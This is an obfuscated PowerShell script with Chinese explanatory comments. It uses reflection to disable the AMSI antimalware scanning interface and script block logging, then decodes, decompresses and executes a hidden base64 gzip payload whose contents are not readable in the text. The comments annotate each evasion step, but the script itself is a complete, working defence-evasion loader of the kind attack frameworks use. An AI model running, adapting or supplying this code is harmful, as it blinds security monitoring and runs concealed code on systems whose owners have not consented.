# $lq 的结果是 EnableScriptBlockLogging
$lq=(('{'+'2}nableSc{4}i{'+'1}tBloc{5}In{3'+'}o'+'cation{0}o'+'g'+'gin'+'g')-f'L','p','E','v','r','k'); 
# $dv 的结果是 DisableScriptBlockLogging
$dv=(('{3}n{0}bleScri'+'p{'+'1}'+'{2}lockL'+'ogging'+'')-f'a','t','B','E');
If($PSVersionTable.PSVersion.Major -ge 3){ 
    # $iDE6h 是 System.Management.Automation.Utils
    $iDE6h=[Ref].Assembly.GetType(((''+'{0}{2'+'}s'+'tem.{'+'4}'+'ana{3}eme'+'nt.'+'A{5}tomation.{1}tils')-f'S','U','y','g','M','u')); 
    # $iM 是 System.Management.Automation.AmsiUtils
    $iM=[Ref].Assembly.GetType((('{'+'6}{2}ste'+'m'+'.{0'+'}ana{3'+'}'+'eme'+'nt'+'.'+'{8'+'}{1}t{7'+'}mat'+'{9}'+'{7}n'+'.{8}ms'+'{'+'9}{4}t{'+'9}'+'{'+'5}s'+'')-f'M','u','y','g','U','l','S','o','A','i')); 
    $m9G=[Collections.Generic.Dictionary[string,System.Object]]::new();
    # $dP_ 是 ScriptBlockLogging
    $dP_=(('Scri'+'{1}'+'t{2}loc{0}L'+'o'+'gging')-f'k','p','B'); 
    $ng=$iDE6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); 
    # 下面两个 if else 作用是禁用 AMSI 检查和日志记录
    # 过反射禁用了 AMSI（反恶意软件扫描接口）和 PowerShell 脚本块日志记录
    # 设置 $iM 的 amsiInitFailed 字段为 true，并通过修改组策略设置禁用脚本块日志记录。
    if ($iM) { 
        $iM.GetField((('a{0}s'+'i{3}'+'{'+'4}i{'+'2}F'+'a'+'ile{'+'1}'+'')-f'm','d','t','I','n'),'NonPublic,Static').SetValue($null,$true); 
    }; 
    If ($ng) { 
        $fF=$ng.GetValue($null); 
        If($fF[$dP_]){ 
            $fF[$dP_][$lq]=0; $fF[$dP_][$dv]=0; 
        } 
        $m9G.Add($dv,0); $m9G.Add($lq,0); 
        $fF['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$dP_]=$m9G; 
    } Else { 
        [Ref].Assembly.GetType(((''+'Sy'+'stem.'+'{0}ana{'+'3}ement'+'.A{4'+'}tomat'+'ion.'+'Script{1}{2}oc{5}')-f'M','B','l','g','u','k')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); 
    }
};

&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAG1aYWYCA71WbW/aSBD+Xqn/waqQbEsEDPjSJFKlWxsc3GICMS8JFJ0ce4ENay/Y6xDS63+/WWyHREnucif1VkLsy8zs7DPPzHieRj4nLJLu/2C3D9KPjx+kfPS82AslpeSjwcllWSpFnYZ6{1}C35t8Gt9EVSpmi9brLQI9Hs7MxM4xhHPFtXzjFHSYLDG0pwoqjSn9J4iWN8dHFzi30u/ZBKf1T{1}KbvxaC62Mz1/iaUjFAXirMN8T/hWcdeUcEX+/l1Wp0e1WaW1ST2aKLK'+'7Szg{1}KwGlsir9VMWFg90aK7JD/JglbM4rYxI16pVhlHhz3AVrd9jBfMmCRIbHHJ4TY57GUfYqYSYTUmSY9mLmoyCIcZLIZWkqLpj{1}Zr8r0/z2yzTiJMQV{1}+I4ZmsXx3fEx0ml7UUBxZd4PgMtl8ckWsxUFcTu2AorpSiltCz9Gz'+'NKF28'+'L7N6rpDxVAqkej9WyC{1}rLdzosSCn{1}N{1}VXHM2IoMLIyQAA/hQYzgsKbYLPrxDosFGM6f4Eg8tKjyVkr/tF0sqSA5d7nMU7WJYGcYrV2SPgUon'+'0y++1VSsUQc3T5gvYmo4YCWYHA8/CX5pjIfI2lZt4TiLc3EVeSPyCrcprEcFzi'+'vdwVAqxLvinyPkBDpqY4oXHBcaCGC/UWiHhj7p'+'GSmiAY+RDVBPwCgKuPncmC5si25GDQ4AuWwNTS3PIEVxI53mxK24XaxC'+'STeolSVnqpZCkfllysUdxUJZQlJD8CKWc7afywV0npZz4XsILczP1'+'GZj5pSaLEh'+'6nPoQUABi4a+wTjwo8ylKbBNjYuWRRXC6/iobpUQqZA5buIBqwI1BwuSBKDH4CKdSKi7kdrik{1}QWJfMCzqLaA85Nmx55W3wIH8qpNFCmR8F5gUYDxxEQLtUsbL'+'0ojEHIqPwFcQ6z948LLogCtmjP{1}gK'+'EV'+'aTY0dF8QvUU1wM4dmD0TMAQQrZqHhJfhYz4qL'+'8ql6QXoI'+'xnWz7RI8WpGavYWfA7+hMz/pcY2FpGEzxzeT3rl1gsh2sfVPusgPvgb41B3p3G3Z3{1}yhdp9ohr70DW0A86HNr22b2+eoPVj6V{1}u1wk7XTu6r2/bY8ZvGw7aeAEN1vX2loUZDv2hoK0DumtQWKxR0Q7K978AcquhFx7ATQ7Np66t5eT{1}uW5MxbVd1azkfs8Q9vm5Wq9XTwGs6{1}4QMFjSc3VXtkg3afmjoEauemvoKtRAyo9bIMti3ayNGverIW6zZBLWMRX1hIrN/QfCkP7SMft8y0PD8dtM8rS6qp+Mrb2mMR3UyWV9dLmFtbdt9p6rpdoDv2UlnTEZ3wpaxaV0s+gLHY6ejk3Csr2p1hHXr+LflJvw2Ctg2TfSraiZrWJMrD3Um{1}6tarV0ndW9lMGSAs'+'jXZoPPl9drqUbhrMKwzNKLdg2y/3fzmT2qfE+fLJwj5dEgi3qjPSg/mw1ZUw48fStQynkT+rVrveHGy9CgwAop4kY8Wi'+'628LPcYERqKknX4FY4jTKEnQtcs2IwoZb7oC6KCQ0vKGoXoW0N779VrM1V6FFQP7aLY{1}jubgJeQHlSrdHC04Muydt/QNKjy2r2m7/Pg/S8z2XqngKmy6BICl8ww3RsGW2QuKcr/ABR8C3AoTG9'+'C9RZqcPcKSgnUtSzFBXYGY/QpctmzHnlwwA0Aq8Gzp+IbYE8PUD/CG6nERYd82nFLd/hz7xdTJq9US/gL/oEyh72/{1}X0XjbTyHp0Xu'+'883npT3X4nA2CMcRF2ouRRn3f9VIPI0eRJhER5Ig3k+xBfxRcqPuv'+'CFtS/6fwGFVhWBjQsAAA{0}{0}')-f'=','O')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))